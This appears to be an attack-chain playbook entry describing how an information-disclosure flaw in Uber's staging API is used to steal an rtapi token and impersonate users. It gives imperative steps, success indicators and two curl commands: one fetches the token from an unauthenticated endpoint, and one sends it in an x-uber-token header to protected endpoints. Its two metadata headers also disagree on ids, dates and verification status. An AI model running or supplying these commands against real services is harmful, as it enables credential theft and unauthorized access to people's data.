---
tags:
  - information-disclosure
  - api-vulnerability
  - token-leak
  - uber
type: attack_chain
tools: []
tactics:
  - '[[Credential Access]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Retrieve-rtapi-Token-via-Unauthenticated-API-Endpoint]]'
  - '[[procedures/Access-rtapi-Endpoints-Using-Disclosed-Token]]'
step_count: 2
techniques:
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:22.801Z'
description: >-
  A multi-stage attack exploiting an unauthenticated API endpoint to disclose a
  sensitive rtapi token, enabling unauthorized access to Uber's rtapi services.
skill_level: beginner
impact_level: high
id: d18b38a1-a78b-4619-8a38-1ff3c68e82dd
validated: true
mitre_tactics:
  - '[[Credential Access]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
  - '[[Valid Accounts]]'
---
---
id: 123e4567-e89b-12d3-a456-426614174000
name: Information Disclosure of rtapi Token Leading to Unauthorized Access in Uber Staging API
type: attack_chain
description: "A multi-stage attack exploiting an unauthenticated API endpoint to disclose a sensitive rtapi token, enabling unauthorized access to Uber's rtapi services."
verified: false
submitted: false
step_count: 2
created_at: 2023-10-01T00:00:00Z
updated_at: 2023-10-01T00:00:00Z
procedures: [[procedures/Retrieve-rtapi-Token-via-Unauthenticated-API-Endpoint]], [[procedures/Access-rtapi-Endpoints-Using-Disclosed-Token]]
techniques: [[Unsecured Credentials]], [[Valid Accounts]]
tactics: [[Credential Access]], [[Initial Access]]
tags: information-disclosure, api-vulnerability, token-leak, uber
platforms: Web
tools: []
---

# Information Disclosure of rtapi Token Leading to Unauthorized Access in Uber Staging API

Multi-stage attack chain demonstrating a complete attack workflow exploiting an information disclosure vulnerability in Uber's staging environment.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~1 minutes |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Retrieve rtapi Token] --> B[Access rtapi Endpoints]
    B --> C[Unauthorized Data Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (standard HTTP client like curl or browser)

### Target Environment

- Web platform
- Access to Uber staging API endpoints
- No specific ports or services required beyond HTTP/HTTPS

### Initial Access Requirements

- Internet connectivity
- No credentials or prior access needed due to lack of authentication

## Detailed Attack Procedures

### Step 1: Retrieve rtapi Token
procedure: [[procedures/Retrieve-rtapi-Token-via-Unauthenticated-API-Endpoint]]

**Objective**: Exploit the unauthenticated endpoint to obtain a sensitive rtapi token for any user.

**Instructions**: Use [[commands/curl-retrieve-rtapi-token]] to call the vulnerable API endpoint:

```bash
curl https://video-support-staging.uber.com/video/api/getPopulousUser
```

**Expected Output**: JSON response containing the rtapi token, e.g., {"token": "sensitive_rtapi_token_value"}.

**Success Indicators**:
- JSON response received without authentication errors
- rtapi token extracted from the response

### Step 2: Access rtapi Endpoints
procedure: [[procedures/Access-rtapi-Endpoints-Using-Disclosed-Token]]

**Objective**: Use the disclosed token to impersonate a user and access protected rtapi endpoints.

**Instructions**: Substitute the retrieved token into the x-uber-token header using [[commands/curl-access-rtapi-with-token]]:

```bash
curl -H "x-uber-token: YOUR_RETRIEVED_TOKEN" https://rtapi.uber.com/some-protected-endpoint
```

Replace YOUR_RETRIEVED_TOKEN with the actual token from Step 1 and target a specific rtapi endpoint.

**Expected Output**: Successful response from rtapi endpoint, potentially containing user data or services.

**Success Indicators**:
- HTTP 200 response from rtapi endpoint
- Access to sensitive data without valid user credentials

## Attack Chain Summary

### Key Achievements

1. Disclosed sensitive rtapi token without authentication
2. Gained unauthorized access to Uber's rtapi services
3. Demonstrated potential for user data exposure or service manipulation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unsecured Credentials]] Unsecured Credentials
- [[Valid Accounts]] Valid Accounts

### MITRE ATT&CK Tactics

- [[Credential Access]] Credential Access
- [[Initial Access]] Initial Access

---
*Last updated: 2023-10-01T00:00:00Z*
